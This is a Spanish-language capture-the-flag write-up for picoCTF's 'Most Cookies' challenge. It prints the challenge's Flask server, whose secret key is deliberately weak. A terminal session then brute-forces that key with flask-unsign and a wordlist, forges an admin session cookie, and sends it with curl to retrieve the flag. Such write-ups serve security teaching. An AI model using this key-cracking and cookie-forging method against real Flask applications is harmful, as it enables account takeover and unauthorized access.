Descripción
Muy bien, basta de usar mi propio cifrado. ¡Las cookies de sesión de Flask deberían ser bastante seguras![servidor.pyhttp](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py)[://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)



Hints:
1.⁠ ⁠¿Qué tan segura es una galleta de frasco?

Solución 1

Con web shell

Sepulveda24-picoctf@webshell:~$ ls
README.txt     cookies.txt  flag    flag.2    server.py
challenge.zip  drop-in      flag.1  flag.png  server.py.1
Sepulveda24-picoctf@webshell:~$ cat server.py
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()

Sepulveda24-picoctf@webshell:~$ cat cookies.txt 
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
Sepulveda24-picoctf@webshell:~$ source ~/.venv/bin/activate
(.venv) Sepulveda24-picoctf@webshell:~$ python3 -m pip install flask-unsign
Requirement already satisfied: flask-unsign in ./.venv/lib/python3.10/site-packages (1.2.1)
Requirement already satisfied: markupsafe in ./.venv/lib/python3.10/site-packages (from flask-unsign) (3.0.2)
Requirement already satisfied: requests in ./.venv/lib/python3.10/site-packages (from flask-unsign) (2.32.3)
Requirement already satisfied: itsdangerous in ./.venv/lib/python3.10/site-packages (from flask-unsign) (2.2.0)
Requirement already satisfied: werkzeug in ./.venv/lib/python3.10/site-packages (from flask-unsign) (3.1.3)
Requirement already satisfied: flask in ./.venv/lib/python3.10/site-packages (from flask-unsign) (3.1.0)
Requirement already satisfied: blinker>=1.9 in ./.venv/lib/python3.10/site-packages (from flask->flask-unsign) (1.9.0)
Requirement already satisfied: Jinja2>=3.1.2 in ./.venv/lib/python3.10/site-packages (from flask->flask-unsign) (3.1.6)
Requirement already satisfied: click>=8.1.3 in ./.venv/lib/python3.10/site-packages (from flask->flask-unsign) (8.1.8)
Requirement already satisfied: certifi>=2017.4.17 in ./.venv/lib/python3.10/site-packages (from requests->flask-unsign) (2025.1.31)
Requirement already satisfied: idna<4,>=2.5 in ./.venv/lib/python3.10/site-packages (from requests->flask-unsign) (3.10)
Requirement already satisfied: charset-normalizer<4,>=2 in ./.venv/lib/python3.10/site-packages (from requests->flask-unsign) (3.4.1)
Requirement already satisfied: urllib3<3,>=1.21.1 in ./.venv/lib/python3.10/site-packages (from requests->flask-unsign) (2.3.0)
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiGzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5YBq1hNDrw" --wordlist cookies.txt
[!] Failed to decode cookie, are you sure this was a Flask session cookie? 'utf-8' codec can't decode byte 0xb3 in position 14: invalid start byte
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOi
Jzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5YBq1hNDrw" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'fortune'
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret  "fortune" eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5Y
Bq1hNDrw
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET]
                    [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT]
                    [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT] [-q]
                    [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5YBq1hNDrw
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret  "fortune" eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5YBq1hNDrw
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET]
                    [--salt SALT] [--wordlist WORDLIST] [--threads THREADS]
                    [--no-literal-eval] [--server SERVER] [--insecure] [-o OUTPUT]
                    [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT] [-q]
                    [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-jIEw.5xm2Pt1ibdUiBox0J5YBq1hNDrw
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret  "fortune"                                                                  
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620" | grep pico
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620" | grep pico
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620" | grep
 pico
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620" | grep pico
(.venv) Sepulveda24-picoctf@webshell:~$ 
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620" | grep pico
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620"       
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y1ow.mDxE3Utzl-6lpAS1Q5h0PpW7620"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click (.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOi
JibGFuayJ9.Z-y4ng.1kNBCAsZjZsfUz-x-oqURTX1cfo" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
(.venv) Sepulveda24-picoctf@webshell:~$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret  "peanut butter" 
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y46g.2EjsLIDmT2cApD83EMmz4hAUAVo
(.venv) Sepulveda24-picoctf@webshell:~$ curl -s http://mercury.picoctf.net:53700/display -H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y46g.2EjsLIDmT2cApD83EMmz4hAUAVo" | grep 
pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_3646b931}</code></p>

Notas adicionales

--------------------


Referencias

https://github.com/pallets/flask
https://webshell.picoctf.org